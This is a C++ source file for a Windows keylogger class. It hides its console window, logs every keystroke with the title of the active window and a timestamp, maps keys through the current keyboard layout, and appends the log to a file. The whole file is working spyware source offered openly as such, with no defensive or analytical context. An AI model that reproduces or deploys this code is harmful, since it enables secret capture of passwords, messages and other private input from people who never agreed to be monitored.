#include "../../include/keylogger.h"

#include <Windows.h>
#include <sstream>
#include <map>

Keylogger::Keylogger(OSManager& manager, HookManager& hookManager)
    : 	_LOGGING_FORMAT(LoggingFormat::Default), _MOUSE_IGNORE(true),
		_manager(manager), _hookManager(hookManager)
{
    #if LOGGING_FORMAT == LoggingFormat::Default
        _VIRTUAL_KEY_NAME = { 
	        {VK_BACK,       "[BACKSPACE]" },
	        {VK_RETURN,	    "\n"          },
	        {VK_SPACE,	    "_"           },
	        {VK_TAB,	    "[TAB]"       },
	        {VK_SHIFT,	    "[SHIFT]"     },
	        {VK_LSHIFT,	    "[LSHIFT]"    },
	        {VK_RSHIFT,	    "[RSHIFT]"    },
	        {VK_CONTROL,    "[CONTROL]"   },
	        {VK_LCONTROL,	"[LCONTROL]"  },
	        {VK_RCONTROL,	"[RCONTROL]"  },
	        {VK_MENU,	    "[ALT]"       },
	        {VK_LWIN,	    "[LWIN]"      },
	        {VK_RWIN,	    "[RWIN]"      },
	        {VK_ESCAPE,	    "[ESCAPE]"    },
	        {VK_END,	    "[END]"       },
	        {VK_HOME,	    "[HOME]"      },
	        {VK_LEFT,	    "[LEFT]"      },
	        {VK_RIGHT,	    "[RIGHT]"     },
	        {VK_UP,		    "[UP]"        },
	        {VK_DOWN,	    "[DOWN]"      },
	        {VK_PRIOR,	    "[PG_UP]"     },
	        {VK_NEXT,	    "[PG_DOWN]"   },
	        {VK_OEM_PERIOD,	"."           },
	        {VK_DECIMAL,	"."           },
	        {VK_OEM_PLUS,	"+"           },
	        {VK_OEM_MINUS,	"-"           },
	        {VK_ADD,		"+"           },
	        {VK_SUBTRACT,	"-"           },
	        {VK_CAPITAL,	"[CAPSLOCK]"  },
        };
    #endif
};

void Keylogger::Listen() {
    this->_manager.setTerminalVisibility(false);
}

int Keylogger::save(int keyStroke) {
	if (_MOUSE_IGNORE) {
		if (keyStroke == VK_LBUTTON || keyStroke == VK_RBUTTON) 
			return 0;
	}

	std::stringstream output;
	char lastwindow[256] = "";

	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground)
	{
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0)
		{
			strcpy_s(lastwindow, sizeof(lastwindow), window_title);

			time_t t = time(NULL);
			struct tm tm;
			localtime_s(&tm, &t);
			char s[64];
			strftime(s, sizeof(s), "%c", &tm);

			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
		}
	}

if (_LOGGING_FORMAT == 10){
	output << '[' << keyStroke << ']';
}
else if (_LOGGING_FORMAT == 16){
	output << std::hex << "[" << keyStroke << ']';
}
else{
	if (_VIRTUAL_KEY_NAME.find(keyStroke) != _VIRTUAL_KEY_NAME.end())
	{
		output << _VIRTUAL_KEY_NAME.at(keyStroke);
	}
	else
	{
		char key;
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		key = MapVirtualKeyExA(keyStroke, MAPVK_VK_TO_CHAR, layout);

		if (!lowercase)
		{
			key = tolower(key);
		}
		output << char(key);
	}
}
	output_file << output.str();
	output_file.flush();

	std::cout << output.str();

	return 0;

}